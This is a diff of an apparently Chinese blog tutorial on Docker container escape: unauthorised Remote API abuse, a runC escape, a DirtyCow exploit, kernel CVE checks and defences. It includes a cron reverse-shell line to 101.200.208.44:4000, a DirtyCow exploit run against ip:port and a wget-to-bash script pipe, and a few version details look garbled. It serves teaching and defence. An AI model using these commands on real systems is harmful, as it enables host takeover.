@@ -497,30 +533,33 @@ echo -e &#34;|/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377
 
 在攻击主机上开启一个监听，然后在容器里运行一个可以崩溃的程序
 vim t.c
-#####include&lt;stdio.h&gt;
+#include&lt;stdio.h&gt;
 int main(void)  {
    int *a  = NULL;
    *a = 1;
    return 0;
 }
 gcc t.c -o t
-./t</code></pre><h6 id="挂载宿主机根目录" class="heading-element"><span>0.0.0.4.4  挂载宿主机根目录</span>
+./t</code></pre><h2 id="挂载宿主机根目录" class="heading-element"><span>挂载宿主机根目录</span>
   <a href="#%e6%8c%82%e8%bd%bd%e5%ae%bf%e4%b8%bb%e6%9c%ba%e6%a0%b9%e7%9b%ae%e5%bd%95" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>执行以下命令，如果返回 Root directory is mounted. 则说明宿主机目录被挂载</p>
+</h2><p>执行以下命令，如果返回 Root directory is mounted. 则说明宿主机目录被挂载</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name passwd 2&gt;/dev/null | grep /etc/passwd | wc -l | grep -q <span style="color:#a6be9d">7</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Root directory is mounted.&#34;</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Root directory is not mounted.&#34;</span></span></span></code></pre></div><p>如果返回 Root directory is not mounted. 则说明没有挂载</p>
-<h6 id="remote-api未授权访问" class="heading-element"><span>0.0.0.4.5  Remote API未授权访问</span>
+<h2 id="remote-api未授权访问" class="heading-element"><span>Remote API未授权访问</span>
   <a href="#remote-api%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>执行以下命令，如果返回 Docker Remote API Is Enabled. 说明目标存在 Docker remote api 未授权访问</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#58a1dd">IP</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">`</span>hostname -i | awk -F. <span style="color:#a6be9d">&#39;{print $1 &#34;.&#34; $2 &#34;.&#34; $3 &#34;.1&#34;}&#39;</span> <span style="color:#a6be9d">`</span> <span style="color:#ff636f">&amp;&amp;</span> timeout <span style="color:#a6be9d">3</span> bash -c <span style="color:#a6be9d">&#34;echo &gt;/dev/tcp/</span><span style="color:#58a1dd">$IP</span><span style="color:#a6be9d">/2375&#34;</span> &gt; /dev/null 2&gt;&amp;<span style="color:#a6be9d">1</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Docker Remote API Is Enabled.&#34;</span> <span style="color:#ff636f">||</span> <span style="color:#58a1dd">echo</span> <span style="color:#a6be9d">&#34;Docker Remote API is Closed.&#34;</span></span></span></code></pre></div><p>如果返回 Docker Remote API is Closed. 则表示目标不存在 Docker remote api 未授权访问</p>
 </blockquote>
 <p>docker swarm中默认通过2375端口通信。绑定了一个Docker Remote API的服务，可以通过HTTP、Python、调用API来操作Docker。</p>
-<p>####### 未授权访问</p>
-<p>当使用官方推荐启动方式时</p>
+<h3 id="未授权访问" class="heading-element"><span>未授权访问</span>
+  <a href="#%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>当使用官方推荐启动方式时</p>
 <pre tabindex="0"><code>dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</code></pre><p>在没有其他网络访问限制的主机上使用，则会在公网暴漏端口。</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081631355.webp" alt="image-20240408163124200" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081631355.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081631355.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081631355.webp?size=large 2x" data-title="image-20240408163124200" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>1、此时访问/containers/json，便会得到所有容器id字段</p>
@@ -551,30 +590,42 @@ Content-Type: application/json
  &#34;Tty&#34;: false
 }</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081632486.webp" alt="image-20240408163218272" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081632486.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081632486.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081632486.webp?size=large 2x" data-title="image-20240408163218272" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>这种方式只是获取到了docker主机的命令执行权限，但是还无法逃逸到宿主机。因此还是需要写公钥或者计时任务进行逃逸</p>
-<p>####### 逃逸</p>
-<p>1、在容器内安装docker</p>
+<h3 id="逃逸-2" class="heading-element"><span>逃逸</span>
+  <a href="#%e9%80%83%e9%80%b8-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>1、在容器内安装docker</p>
 <pre tabindex="0"><code>apt-get update
 apt-get install docker.io</code></pre><p>2、查看宿主机docker镜像信息</p>
 <pre tabindex="0"><code>docker -H tcp://ip:2375 images</code></pre><p>3、启动一个容器并将宿主机根目录挂在到容器的test目录</p>
 <pre tabindex="0"><code>docker -H tcp://ip:2375 run -it -v /:/test 5d2df19066ac /bin/bash</code></pre><p>4、计时任务反弹shell</p>
-<pre tabindex="0"><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/101.200.208.44/4000 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root</code></pre><h6 id="容器服务缺陷逃逸" class="heading-element"><span>0.0.0.4.6  容器服务缺陷逃逸</span>
+<pre tabindex="0"><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/101.200.208.44/4000 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root</code></pre><h2 id="容器服务缺陷逃逸" class="heading-element"><span>容器服务缺陷逃逸</span>
   <a href="#%e5%ae%b9%e5%99%a8%e6%9c%8d%e5%8a%a1%e7%bc%ba%e9%99%b7%e9%80%83%e9%80%b8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>runc是一个底层服务工具，runC 管理容器的创建，运行，销毁等，docker部分版本服务运行时底层其实在运行着runc服务，攻击者可以通过特定的容器镜像或者exec操作重写宿主机上的runc 二进制文件，并在宿主机上以root身份执行命令。</p>
-<p>####### 影响版本</p>
-<p>docker version &lt;=18.09.2</p>
+</h2><p>runc是一个底层服务工具，runC 管理容器的创建，运行，销毁等，docker部分版本服务运行时底层其实在运行着runc服务，攻击者可以通过特定的容器镜像或者exec操作重写宿主机上的runc 二进制文件，并在宿主机上以root身份执行命令。</p>
+<h3 id="影响版本" class="heading-element"><span>影响版本</span>
+  <a href="#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>docker version &lt;=18.09.2</p>
 <p>RunC version &lt;=1.0-rc6</p>
-<p>####### 环境搭建</p>
-<p>由于对版本有限制，所以用之前docker中的ubuntu环境搭建符合漏洞版本的docker，参考<a href="https://segmentfault.com/a/1190000042702027?utm_source=sf-similar-article"target="_blank" rel="external nofollow noopener noreferrer">Ubuntu安装指定版本的docker - 朝花夕拾 - SegmentFault 思否</a></p>
+<h3 id="环境搭建" class="heading-element"><span>环境搭建</span>
+  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>由于对版本有限制，所以用之前docker中的ubuntu环境搭建符合漏洞版本的docker，参考<a href="https://segmentfault.com/a/1190000042702027?utm_source=sf-similar-article"target="_blank" rel="external nofollow noopener noreferrer">Ubuntu安装指定版本的docker - 朝花夕拾 - SegmentFault 思否</a></p>
 <p>1、安装 apt 依赖包，用于通过HTTPS来获取仓库</p>
 <pre tabindex="0"><code>apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</code></pre><p>2、添加 Docker 的官方 GPG 密钥</p>
 <pre tabindex="0"><code>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -</code></pre><p>3、设置稳定版仓库(添加到/etc/apt/sources.list中)</p>
 <pre tabindex="0"><code>add-apt-repository &#34;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&#34;</code></pre><p>4、更新apt-get</p>
 <pre tabindex="0"><code>apt-get update</code></pre><p>5、查询docker-ce版本</p>
 <pre tabindex="0"><code>apt-cache policy docker-ce</code></pre><p>6、安装指定版本docker</p>
-<pre tabindex="0"><code>apt-get install docker-ce=18.06.1~ce~3-0~ubuntu</code></pre><p>####### 逃逸</p>
-<p>1、编译payload中反弹shell地址</p>
+<pre tabindex="0"><code>apt-get install docker-ce=18.06.1~ce~3-0~ubuntu</code></pre><h3 id="逃逸-3" class="heading-element"><span>逃逸</span>
+  <a href="#%e9%80%83%e9%80%b8-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>1、编译payload中反弹shell地址</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081632048.webp" alt="image-20240408163252879" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081632048.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081632048.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202404081632048.webp?size=large 2x" data-title="image-20240408163252879" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>2、编译生成payload</p>
 <pre tabindex="0"><code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></pre><p>3、编译好后传入docker容器中</p>
@@ -582,15 +633,15 @@ apt-get install docker.io</code></pre><p>2、查看宿主机docker镜像信息</
 docker exec -it 1fa6a736e332 /bin/bash
 cd /home/
 chmod 777 main</code></pre><p>4.运行main程序成功反弹shell</p>
-<pre tabindex="0"><code>./main</code></pre><h5 id="0x02-内核漏洞" class="heading-element"><span>0.0.0.5  0x02 内核漏洞</span>
+<pre tabindex="0"><code>./main</code></pre><h1 id="0x02-内核漏洞" class="heading-element"><span>0x02 内核漏洞</span>
   <a href="#0x02-%e5%86%85%e6%a0%b8%e6%bc%8f%e6%b4%9e" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="cve-2016-5195-dirtycow-脏牛逃逸" class="heading-element"><span>0.0.0.5.1  CVE-2016-5195 DirtyCow 脏牛逃逸</span>
+</h1><h2 id="cve-2016-5195-dirtycow-脏牛逃逸" class="heading-element"><span>CVE-2016-5195 DirtyCow 脏牛逃逸</span>
   <a href="#cve-2016-5195-dirtycow-%e8%84%8f%e7%89%9b%e9%80%83%e9%80%b8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>执行 uname -r 命令，如果在 2.6.22 &lt;= 版本 &lt;= 4.8.3 之间说明可能存在 CVE-2016-5195 DirtyCow 漏洞。</p>
+</h2><p>执行 uname -r 命令，如果在 2.6.22 &lt;= 版本 &lt;= 4.8.3 之间说明可能存在 CVE-2016-5195 DirtyCow 漏洞。</p>
 <p>Dirty Cow是Linux内核中的提权漏洞，源于Linux内核的内存子系统在处理写入拷贝时存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。</p>
 <p>docker和宿主机共享内核，因此就可利用该漏洞进行逃逸</p>
 <pre tabindex="0"><code>git clone https://github.com/gebl/dirtycow-docker-vdso.git
@@ -599,31 +650,31 @@ docker-compose run dirtycow /bin/bash
 
 cd /dirtycow-vdso/
 make
-./0xdeadbeef ip:port // 反弹shell</code></pre><h6 id="cve-2020-14386" class="heading-element"><span>0.0.0.5.2  CVE-2020-14386</span>
+./0xdeadbeef ip:port // 反弹shell</code></pre><h2 id="cve-2020-14386" class="heading-element"><span>CVE-2020-14386</span>
   <a href="#cve-2020-14386" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>执行 uname -r 命令，如果在 4.6 &lt;= 版本 &lt; 5.9 之间说明可能存在 CVE-2020-14386 漏洞。</p>
-<h6 id="cve-2022-0847-dirtypipe-逃逸" class="heading-element"><span>0.0.0.5.3  CVE-2022-0847 DirtyPipe 逃逸</span>
+</h2><p>执行 uname -r 命令，如果在 4.6 &lt;= 版本 &lt; 5.9 之间说明可能存在 CVE-2020-14386 漏洞。</p>
+<h2 id="cve-2022-0847-dirtypipe-逃逸" class="heading-element"><span>CVE-2022-0847 DirtyPipe 逃逸</span>
   <a href="#cve-2022-0847-dirtypipe-%e9%80%83%e9%80%b8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>执行 uname -r 命令，如果在 5.8 &lt;= 版本 &lt; 5.10.102 &lt; 版本 &lt; 5.15.25 &lt; 版本 &lt; 5.16.11 之间说明可能存在 CVE-2022-0847 DirtyPipe 漏洞。</p>
-<h5 id="0x03-容器逃逸检测脚本" class="heading-element"><span>0.0.0.6  0x03 容器逃逸检测脚本</span>
+</h2><p>执行 uname -r 命令，如果在 5.8 &lt;= 版本 &lt; 5.10.102 &lt; 版本 &lt; 5.15.25 &lt; 版本 &lt; 5.16.11 之间说明可能存在 CVE-2022-0847 DirtyPipe 漏洞。</p>
+<h1 id="0x03-容器逃逸检测脚本" class="heading-element"><span>0x03 容器逃逸检测脚本</span>
   <a href="#0x03-%e5%ae%b9%e5%99%a8%e9%80%83%e9%80%b8%e6%a3%80%e6%b5%8b%e8%84%9a%e6%9c%ac" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>项目地址：https://github.com/teamssix/container-escape-check</p>
+</h1><p>项目地址：https://github.com/teamssix/container-escape-check</p>
 <p>直接在容器中执行以下命令即可</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/teamssix/container-escape-check/main/container-escape-check.sh -O -| bash</span></span></code></pre></div><p>不过大多容器可能没有 wget 命令，因此可以将脚本先克隆到本地，然后上传到容器再执行</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/teamssix/container-escape-check.git
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">cd</span> container-escape-check
 </span></span><span style="display:flex;"><span>chmod +x container-escape-check.sh
-</span></span><span style="display:flex;"><span>./container-escape-check.sh</span></span></code></pre></div><h5 id="docker逃逸防御" class="heading-element"><span>0.0.0.7  Docker逃逸防御</span>
+</span></span><span style="display:flex;"><span>./container-escape-check.sh</span></span></code></pre></div><h1 id="docker逃逸防御" class="heading-element"><span>Docker逃逸防御</span>
   <a href="#docker%e9%80%83%e9%80%b8%e9%98%b2%e5%be%a1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><ul>
+</h1><ul>
 <li>更新Docker版本到03.1及更高版本——CVE-2019-14271、覆盖CVE-2019-5736。</li>
 <li>runc版本 &gt;1.0-rc6</li>
 <li>k8s 集群版本&gt;1.12</li>
